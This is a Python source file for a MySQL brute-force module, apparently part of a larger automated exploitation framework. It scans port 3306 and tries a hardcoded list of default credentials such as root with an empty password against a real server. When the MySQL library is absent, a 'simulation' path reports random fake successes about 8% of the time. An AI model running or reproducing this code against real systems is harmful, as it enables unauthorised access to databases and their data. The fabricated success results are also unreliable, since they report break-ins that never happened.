"""
MySQL Exploit Module
Exploits MySQL database vulnerabilities
"""

import socket
from typing import Dict, Tuple

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class MySQL_Exploit(BaseExploit):
    """
    MySQL Brute Force Exploit
    Targets: MySQL databases (port 3306)
    """
    
    def __init__(self):
        super().__init__(
            name="MySQL_BruteForce",
            target_ports=[3306],
            target_os=["Windows", "Linux", "Unix"]
        )
        
        # Common MySQL credentials
        self.mysql_credentials = [
            ("root", ""),
            ("root", "root"),
            ("root", "password"),
            ("root", "mysql"),
            ("root", "admin"),
            ("admin", "admin"),
            ("mysql", "mysql"),
            ("user", "user"),
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if MySQL is accessible"""
        ip = target['ip']
        
        if 3306 not in target.get('open_ports', []):
            return False
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, 3306))
            sock.close()
            
            if result == 0:
                logger.debug(f"MySQL port accessible on {ip}")
                return True
        except Exception as e:
            logger.debug(f"MySQL check failed on {ip}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt MySQL brute force"""
        ip = target['ip']
        logger.info(f"Attempting MySQL brute force on {ip}")
        
        try:
            # Try to import mysql connector
            try:
                import mysql.connector
                has_mysql = True
            except ImportError:
                has_mysql = False
                logger.warning("mysql-connector-python not installed, using simulation")
            
            for username, password in self.mysql_credentials:
                logger.debug(f"Trying MySQL: {username}:{password}")
                
                if has_mysql:
                    success = self._try_mysql_login_real(ip, username, password)
                else:
                    success = self._try_mysql_login_sim(ip, username, password)
                
                if success:
                    self.stats['success'] += 1
                    logger.success(f"MySQL access gained on {ip} with {username}:{password}")
                    
                    return True, {
                        'method': 'MySQL_BruteForce',
                        'credentials': f"{username}:{password}",
                        'port': 3306,
                        'service': 'MySQL'
                    }
            
            self.stats['failure'] += 1
            logger.warning(f"MySQL brute force failed on {ip}")
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"MySQL exploit error on {ip}: {e}")
            return False, {}
    
    def _try_mysql_login_real(self, ip: str, username: str, password: str) -> bool:
        """Try real MySQL login"""
        try:
            import mysql.connector
            
            conn = mysql.connector.connect(
                host=ip,
                user=username,
                password=password,
                connect_timeout=5
            )
            conn.close()
            return True
        except:
            return False
    
    def _try_mysql_login_sim(self, ip: str, username: str, password: str) -> bool:
        """Simulate MySQL login"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, 3306))
            sock.close()
            
            if result != 0:
                return False
            
            # Simulate: 8% success rate
            import random
            return random.random() < 0.08
            
        except:
            return False


if __name__ == "__main__":
    exploit = MySQL_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [3306],
        'os_guess': 'Linux'
    }
    
    if exploit.check_vulnerable(test_target):
        print("Target is vulnerable to MySQL exploit")
        success, result = exploit.exploit(test_target)
        if success:
            print(f"Exploit successful: {result}")
